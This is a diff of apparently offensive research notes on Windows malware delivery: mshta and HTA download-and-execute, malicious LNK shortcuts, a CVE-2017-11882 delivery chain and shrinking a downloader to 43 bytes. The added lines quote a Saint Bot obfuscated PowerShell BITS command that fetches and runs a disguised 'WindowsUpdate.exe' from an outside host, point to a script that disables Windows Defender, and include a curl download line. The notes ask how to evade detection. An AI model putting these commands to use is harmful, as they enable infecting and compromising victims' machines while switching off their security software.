@@ -92,7 +92,7 @@ however creating a download and execute with mshta
 7. creating lnk file
 
 tried doing it through powershell -
-
+  
 
 this detects can we put it in hta to create a shortcut?
 
@@ -203,6 +203,38 @@ https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.m
 
 study lnk exploit
 
+
+
+https://www.malwarebytes.com/blog/threat-intelligence/2021/04/a-deep-dive-into-saint-bot-downloader
+
+```
+&& C:\Windows\System32\cmd.exe /c poweRshELL.eXE -w 1 $env:SEE_MASK_NOZONECHECKS = 1;
+ ImPoRT-modULe bItsTRAnsFer; STArt-bITsTRANSFER -Source "('http://68468438438[.]xyz/soft/win230321.exe')" -Destination $ENV:TEMP\WindowsUpdate.exe ;
+ .('cd') ${eNv:TEMP};
+ ./WindowsUpdate.exe!%SystemRoot%\System32\SHELL32.dll
+ ```
+
+ Once run, the main sample drops another executable in the %TEMP% directory:
+
+"C:\Users\admin\AppData\Local\Temp\InstallUtil.exe"
+
+which then downloads two executables named: def.exe, and putty.exe. It saves them in %TEMP% , and tries to execute them with elevated privileges.
+
+If run, the first sample (def.exe) deploys a batch script disabling Windows Defender. The second sample (named putty.exe) is the main malicious component.
+
+script to disable defender
+
+![](./disable_windows_defender.bat)
+
+for deobfuscating strings : https://github.com/mandiant/flare-floss
+
+ more :
+
+ can we disable any defender scipt?
+ 
+
+
+
 ### Trying 11882 delivery mechanism
 
 was not able to work with unamer's implementation
@@ -229,7 +261,6 @@ however it was found tha tmshta doesnot work so instead we tried executing the b
 THen we needed to reduce thenumber of characterused so thatit can be put in a file within 43 bytes
 
 one thing to try: `curl <server name> -L -o a.exe`
-
 
 
 
